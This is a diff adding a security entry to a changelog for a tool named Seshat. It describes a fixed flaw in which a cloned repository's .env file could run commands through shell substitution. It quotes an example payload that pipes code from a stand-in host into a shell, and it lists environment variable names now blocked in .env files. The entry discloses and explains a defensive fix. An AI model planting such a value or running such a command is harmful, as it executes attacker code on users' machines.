@@ -9,6 +9,8 @@ Versioning: [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+## [1.2.74] - 2026-10-06
+
 ### Security
 
 - **A `.env` file in the working directory can no longer run a command or redirect Seshat.** `Load` reads `.env` from the directory Seshat is started in, which can be a repository that was just cloned, and `ExpandShellValues` runs any `$(...)` found in the configuration: a `.env` holding `SESHAT_API_KEY=$(curl evil.example | sh)` ran that command when the configuration was loaded, before any prompt (shown by a test that makes the command write a file). A `.env` entry is now ignored, with a warning on the standard error output, when its value holds a shell substitution (`$(...)` or a backquote) or when its name is one that decides what is run or where Seshat looks for its configuration or how closed its commands are: `PATH`, `SHELL`, `HOME`, `LD_*`, `DYLD_*`, `GIT_*`, `PYTHON*`, `PERL*`, `NODE_OPTIONS`, `BASH_ENV`, `EDITOR`, `NPM_CONFIG_*`, `SESHAT_RUNTIME_ROOT`, `SESHAT_BASH_*`, `SESHAT_GRPC_ALLOW_*`, `SESHAT_GRPC_AUTH_*` and `SESHAT_GRPC_TLS_*`. They still work from the real environment and from the user's own configuration file. Keys, models and URLs in a `.env` are unchanged. Found by triaging the `gosec` report.
